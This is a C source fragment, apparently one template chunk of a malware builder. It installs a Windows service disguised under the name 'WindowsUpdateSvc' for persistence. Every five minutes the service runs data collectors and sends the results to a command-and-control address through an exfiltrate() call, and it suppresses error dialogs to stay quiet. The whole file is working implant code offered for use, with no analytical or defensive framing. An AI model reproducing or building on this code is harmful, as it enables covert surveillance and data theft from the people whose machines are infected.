// chunk: arch/service
// depends: core/emit_buffer, exfil/*
// provides: main
// note: runs as a Windows service for persistence — survives logoff

#ifndef CHUNK_ARCH_SERVICE
#define CHUNK_ARCH_SERVICE

#define SERVICE_NAME "WindowsUpdateSvc"

static SERVICE_STATUS g_svc_status;
static SERVICE_STATUS_HANDLE g_svc_handle;

static void do_collection(void) {
    init_buffer();
    if (!g_data) return;

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
    free(g_data);
    g_data = NULL;
}

static void WINAPI svc_ctrl_handler(DWORD ctrl) {
    if (ctrl == SERVICE_CONTROL_STOP) {
        g_svc_status.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_svc_handle, &g_svc_status);
    }
}

static void WINAPI svc_main(DWORD argc, LPTSTR *argv) {
    (void)argc; (void)argv;
    g_svc_handle = RegisterServiceCtrlHandlerA(SERVICE_NAME, svc_ctrl_handler);
    if (!g_svc_handle) return;

    g_svc_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svc_status.dwCurrentState = SERVICE_RUNNING;
    g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_svc_handle, &g_svc_status);

    while (g_svc_status.dwCurrentState == SERVICE_RUNNING) {
        do_collection();
        Sleep(300000);
    }
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    SERVICE_TABLE_ENTRYA svc_table[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)svc_main},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcherA(svc_table)) {
        do_collection();
    }

    return 0;
}

#endif
